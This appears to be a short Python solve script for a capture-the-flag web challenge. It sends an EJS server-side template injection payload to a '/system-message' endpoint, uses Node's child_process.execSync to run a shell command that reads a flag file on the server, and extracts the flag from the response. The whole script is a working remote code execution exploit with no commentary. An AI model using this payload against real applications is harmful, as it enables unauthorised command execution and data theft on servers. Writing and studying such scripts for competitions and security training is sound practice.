import requests
import re

url = "http://mainframe-upgraded-mainframe.chall.ybn.sg/"

res = requests.post(f"{url}/system-message", data={
    'message': "<%- process.mainModule.require('child_process').execSync('cat l3ak3d_f1lgsssssss.txt'); %>"
})

flag = repr(res.json()['message']).replace("\\x00", "")
print("Flag:", re.findall(r'(YBN25{.+})', flag)[0])